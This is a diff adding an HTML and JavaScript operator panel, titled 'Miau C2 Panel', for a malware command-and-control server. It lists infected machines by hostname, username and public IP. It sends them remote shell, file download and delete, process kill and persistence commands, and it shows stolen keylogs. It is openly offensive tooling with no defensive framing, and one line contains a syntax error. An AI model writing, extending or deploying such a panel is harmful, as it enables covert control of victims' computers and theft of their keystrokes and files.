@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Miau Panel</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Consolas,monospace;background:#0d1117;color:#c9d1d9;font-size:14px}
+.header{background:#161b22;padding:12px 20px;border-bottom:1px solid #303d50;display:flex;justify-content:space-between;align-items:center}
+.header h1{color:#58a6ff}
+.container{display:flex;height:calc(100vh - 50px)}
+.sidebar{width:280px;background:#161b22;border-right:1px solid #303d50;overflow-y:auto;padding:10px}
+.main{flex:1;padding:20px;overflow-y:auto}
+.client-item{padding:8px 12px;margin:4px 0;border-radius:4px;cursor:pointer;background:#0d1117;border:1px solid #21262d}
+.client-item:hover{border-color:#58a6ff}
+.client-item.active{background:#1f6feb22;border-color:#1f6feb}
+.status{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px}
+.status.online{background:#3fb950}
+.status.offline{background:#6e7681}
+input,textarea,select{background:#0d1117;border:1px solid #303d50;color:#c9d1d9;padding:8px;border-radius:4px;width:100%;font-family:inherit}
+button{background:#238636;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-family:inherit}
+button:hover{background:#2ea043}
+.btn-danger{background:#da3633}
+.btn-danger:hover{background:#f85149}
+.cmd-bar{display:flex;gap:8px;margin:12px 0}
+.cmd-bar select{width:180px}
+.cmd-bar input{flex:1}
+.output{background:#0d1117;border:1px solid #303d50;border-radius:4px;padding:12px;height:400px;overflow-y:auto;white-space:pre-wrap;font-size:13px}
+.login-box{width:320px;margin:100px auto;background:#161b22;padding:24px;border-radius:8px;border:1px solid #303d50}
+.login-box h2{margin-bottom:16px;color:#58a6ff}
+.login-box input{margin-bottom:12px}
+.stats{display:flex;gap:16px;margin-bottom:16px}
+.stat-box{background:#161b22;padding:12px 20px;border-radius:6px;border:1px solid #303d50;text-align:center}
+.stat-box .num{font-size:24px;font-weight:bold;color:#58a6ff}
+.stat-box .label{font-size:12px;color:#8b949e}
+.tab-bar{display:flex;gap:4px;margin-bottom:12px}
+.tab{padding:8px 16px;background:#21262d;border-radius:4px;cursor:pointer}
+.tab.active{background:#1f6feb}
+</style>
+</head>
+<body>
+
+<div id="login" class="login-box">
+<h2>Miau Panel</h2>
+<input type="password" id="pw" placeholder="Password" onkeypress="if(event.key==='Enter')login()">
+<input type="text" id="totp" placeholder="TOTP Code" onkeypress="if(event.key==='Enter')login()">
+<button onclick="login()">Login</button>
+</div>
+
+<div id="app" style="display:none">
+<div class="header">
+<h1>Miau C2 Panel</h1>
+<div>
+<span id="stats-span"></span>
+<button onclick="logout()" style="margin-left:20px">Logout</button>
+</div>
+</div>
+<div class="container">
+<div class="sidebar">
+<div id="clients-list"></div>
+</div>
+<div class="main">
+<div id="welcome" style="text-align:center;margin-top:60px;color:#6e7681">
+<h2>Select a client</h2>
+</div>
+<div id="client-view" style="display:none">
+<h2 id="client-title"></h2>
+<div class="tab-bar">
+<div class="tab active" onclick="switchTab('console')">Console</div>
+<div class="tab" onclick="switchTab('files')">Files</div>
+<div class="tab" onclick="switchTab('processes')">Processes</div>
+<div class="tab" onclick="switchTab('keylogs')">Keylogs</div>
+<div class="tab" onclick="switchTab('network')">Network</div>
+</div>
+<div id="tab-console">
+<div class="cmd-bar">
+<select id="cmd-type">
+<option value="shell">Shell Exec</option>
+<option value="file_list">File List</option>
+<option value="file_download">File Download</option>
+<option value="file_delete">File Delete</option>
+<option value="process_list">Process List</option>
+<option value="process_kill">Process Kill</option>
+<option value="net_list">Network</option>
+<option value="sysinfo">SysInfo</option>
+<option value="ping">Ping</option>
+<option value="persist_install">Install Persistence</option>
+<option value="persist_remove">Remove Persistence</option>
+<option value="uninstall">Uninstall</option>
+</select>
+<input type="text" id="cmd-args" placeholder="Arguments..." onkeypress="if(event.key==='Enter')sendCmd()">
+<button onclick="sendCmd()">Execute</button>
+</div>
+<div class="output" id="console-output"></div>
+</div>
+<div id="tab-files" style="display:none">
+<div class="cmd-bar">
+<input type="text" id="file-path" placeholder="Directory path...">
+<button onclick="listFiles()">List</button>
+</div>
+<div class="output" id="files-output"></div>
+</div>
+<div id="tab-processes" style="display:none">
+<button onclick="listProcesses()">Refresh</button>
+<div class="output" id="processes-output" style="margin-top:8px"></div>
+</div>
+<div id="tab-keylogs" style="display:none">
+<button onclick="getKeylogs()">Load Keylogs</button>
+<div class="output" id="keylogs-output" style="margin-top:8px"></div>
+</div>
+<div id="tab-network" style="display:none">
+<button onclick="getNetwork()">Refresh</button>
+<div class="output" id="network-output" style="margin-top:8px"></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<script>
+const API = window.location.origin;
+let token = '';
+let currentClient = null;
+let pollInterval = null;
+
+async function api(path, opts={}) {
+opts.headers = {...opts.headers, 'X-Panel-Pw': token, 'X-Panel-Totp': ''};
+const r = await fetch(API+path, opts);
+return r.json();
+}
+
+async function login() {
+token = document.getElementById('pw').value;
+const totp = document.getElementById('totp').value;
+const r = await fetch(API+'/api/auth/login', {
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({password:token, totp:totp})
+});
+if(r.ok) {
+document.getElementById('login').style.display='none';
+document.getElementById('app').style.display='block';
+loadClients();
+} else {
+alert('Login failed');
+}
+}
+
+function logout() {
+token='';
+location.reload();
+}
+
+async function loadClients() {
+const r = await api('/api/clients');
+let html='';
+for(const c of r.clients) {
+const st = c.state==='ONLINE'?'online':'offline';
+html+=`<div class="client-item" onclick="selectClient('${c.install_id}')">
+<span class="status ${st}"></span>${c.hostname||c.install_id}<br>
+<small>${c.username||''} @ ${c.pub_ip||'unknown'}</small>
+</div>`;
+}
+document.getElementById('clients-list').innerHTML=html;
+updateStats(r.clients);
+}
+
+function updateStats(clients) {
+const on = clients.filter(c=>c.state==='ONLINE').length;
+document.getElementById('stats-span').textContent=`Online: ${on}/${clients.length}`;
+}
+
+async function selectClient(id) {
+currentClient = id;
+const r = await api(`/api/client/${id}`);
+document.getElementById('welcome').style.display='none';
+document.getElementById('client-view').style.display='block';
+document.getElementById='client-title').textContent = r.client.hostname || id;
+}
+
+function switchTab(name) {
+document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+document.querySelectorAll('[id^="tab-"]').forEach(t=>t.style.display='none');
+document.getElementById('tab-'+name).style.display='block';
+event.target.classList.add('active');
+}
+
+async function sendCmd() {
+if(!currentClient) return;
+const type = document.getElementById('cmd-type').value;
+const args = document.getElementById('cmd-args').value;
+const r = await api(`/api/client/${currentClient}/cmd`, {
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({cmd_type:type, args:args})
+});
+pollResponse(r.cmd_id);
+}
+
+async function pollResponse(cmdId) {
+const out = document.getElementById('console-output');
+out.textContent = 'Waiting for response...\n';
+if(pollInterval) clearInterval(pollInterval);
+pollInterval = setInterval(async()=>{
+const r = await api(`/api/command/${cmdId}/resp`);
+if(!r.pending) {
+clearInterval(pollInterval);
+out.textContent = r.message + '\n' + (r.data_b64 ? atob(r.data_b64) : '');
+}
+}, 1000);
+}
+
+async function listFiles() {
+const p = document.getElementById('file-path').value || '.';
+const r = await api(`/api/client/${currentClient}/cmd`, {
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({cmd_type:'file_list', args:p})
+});
+pollResponseToBox(r.cmd_id, 'files-output');
+}
+
+async function listProcesses() {
+const r = await api(`/api/client/${currentClient}/cmd`, {
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({cmd_type:'process_list', args:''})
+});
+pollResponseToBox(r.cmd_id, 'processes-output');
+}
+
+async function getKeylogs() {
+const r = await api(`/api/keylogs/${currentClient}`);
+const out = document.getElementById('keylogs-output');
+out.textContent = JSON.stringify(r.keylogs, null, 2);
+}
+
+async function getNetwork() {
+const r = await api(`/api/client/${currentClient}/cmd`, {
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({cmd_type:'net_list', args:''})
+});
+pollResponseToBox(r.cmd_id, 'network-output');
+}
+
+async function pollResponseToBox(cmdId, boxId) {
+const out = document.getElementById(boxId);
+out.textContent = 'Loading...\n';
+if(pollInterval) clearInterval(pollInterval);
+pollInterval = setInterval(async()=>{
+const r = await api(`/api/command/${cmdId}/resp`);
+if(!r.pending) {
+clearInterval(pollInterval);
+out.textContent = r.message + '\n' + (r.data_b64 ? atob(r.data_b64) : '');
+}
+}, 1000);
+}
+
+setInterval(loadClients, 5000);
+</script>
+</body>
+</html>
